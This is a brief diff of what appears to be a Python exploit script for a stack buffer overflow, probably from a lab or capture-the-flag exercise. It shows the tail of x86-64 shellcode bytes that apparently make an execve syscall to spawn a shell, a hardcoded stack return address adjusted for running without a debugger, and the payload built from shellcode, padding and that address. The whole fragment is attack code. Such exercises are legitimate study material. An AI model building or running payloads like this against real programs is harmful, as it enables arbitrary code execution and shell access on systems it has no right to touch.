@@ -40,7 +40,7 @@ buf2 += b"\x74\x61\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05"
 
 shellcode = buf
 
-return_addresss = b"\x20\xdc\xff\xff\xff\x7f\x00\x00" # without gdb
+return_addresss = b"\x30\xdc\xff\xff\xff\x7f\x00\x00" # without gdb
 #return_addresss = b"\xd0\xdb\xff\xff\xff\x7f\x00\x00" # with gdb
 
 payload = shellcode + b'x' * (stack_size - len(shellcode)) + return_addresss
